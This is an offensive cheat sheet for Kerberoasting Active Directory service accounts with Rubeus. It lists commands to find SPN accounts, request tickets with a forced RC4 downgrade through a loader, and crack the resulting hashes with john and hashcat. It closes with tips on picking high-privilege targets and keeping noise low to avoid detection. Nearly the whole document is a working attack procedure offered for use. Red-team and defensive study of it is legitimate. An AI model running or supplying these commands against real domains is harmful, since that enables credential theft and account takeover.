# Kerberoasting (Rubeus)

Request service tickets for accounts with SPNs and crack offline. Targets service accounts using RC4 encryption.

## Find Kerberoastable Accounts
```powershell
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```

## Kerberoast Specific User
```
Loader.exe -path Rubeus.exe -args kerberoast /user:<svc_account> /simple /rc4opsec /outfile:hashes.txt
```
- `/rc4opsec` — requests RC4 (downgrade from AES if possible) for easier cracking
- `/simple` — outputs hashcat-compatible format

## Kerberoast All
```
Loader.exe -path Rubeus.exe -args kerberoast /simple /rc4opsec /outfile:hashes.txt
```

## Crack with John
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## Crack with Hashcat
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Notes
- Only works against accounts that support RC4 (most legacy configs do)
- High-privilege service accounts are prime targets
- Prefer targeted kerberoasting (`/user:`) to reduce noise
